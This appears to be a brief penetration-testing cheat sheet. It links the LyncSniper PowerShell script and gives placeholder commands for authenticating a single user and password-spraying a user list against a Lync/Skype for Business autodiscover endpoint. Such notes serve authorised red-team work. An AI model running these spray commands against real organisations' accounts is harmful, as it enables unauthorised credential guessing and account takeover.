### Source
https://raw.githubusercontent.com/mdsecresearch/LyncSniper/master/LyncSniper.ps1  

### Authenticate with single user
```
Invoke-Authenticate -Username &lt;user&gt;@&lt;domainIntern&gt; -Password &lt;password&gt; -baseurl &lt;lyncdiscoverUrl&gt; -verbose
```

### Password spray (return 400 if credentials are wrong)
```
Invoke-LyncSpray -Delay 5000 -UserList &lt;userFile&gt; -Password &lt;password&gt; -AutoDiscoverURL &lt;lyncdiscoverUrl&gt; -verbose
```


